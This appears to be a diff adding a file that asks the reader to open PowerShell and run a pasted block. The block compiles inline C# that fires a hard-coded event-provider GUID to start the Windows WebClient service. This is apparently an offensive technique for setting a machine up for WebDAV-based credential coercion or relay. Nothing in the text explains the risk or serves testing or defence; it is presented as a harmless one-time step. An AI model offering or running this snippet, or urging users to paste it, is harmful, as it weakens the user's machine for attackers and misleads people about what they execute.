@@ -1,0 +1,68 @@
+Please open powershell and run this once:
+```
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WebClientStarter
+{
+    [StructLayout(LayoutKind.Sequential)]
+    public struct EVENT_DESCRIPTOR
+    {
+        public ushort Id;
+        public byte Version;
+        public byte Channel;
+        public byte Level;
+        public byte Opcode;
+        public ushort Task;
+        public ulong Keyword;
+    }
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern uint EventRegister(ref Guid ProviderId, IntPtr EnableCallback, IntPtr CallbackContext, out ulong RegHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern uint EventWrite(ulong RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, IntPtr UserData);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern uint EventUnregister(ulong RegHandle);
+
+    public static void StartWebClient()
+    {
+        Guid providerGuid = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);
+        ulong regHandle = 0;
+
+        uint status = EventRegister(ref providerGuid, IntPtr.Zero, IntPtr.Zero, out regHandle);
+        if (status != 0)
+        {
+            Console.WriteLine("EventRegister failed with error: " + status);
+            return;
+        }
+
+        EVENT_DESCRIPTOR eventDesc = new EVENT_DESCRIPTOR
+        {
+            Id = 1,
+            Version = 0,
+            Channel = 0,
+            Level = 4,
+            Opcode = 0,
+            Task = 0,
+            Keyword = 0
+        };
+
+        status = EventWrite(regHandle, ref eventDesc, 0, IntPtr.Zero);
+        if (status != 0)
+        {
+            Console.WriteLine("EventWrite failed with error: " + status);
+            EventUnregister(regHandle);
+            return;
+        }
+
+        EventUnregister(regHandle);
+        Console.WriteLine("[+] WebClient service started successfully.");
+    }
+}
+"@ -Language CSharp
+
+[WebClientStarter]::StartWebClient()
+```
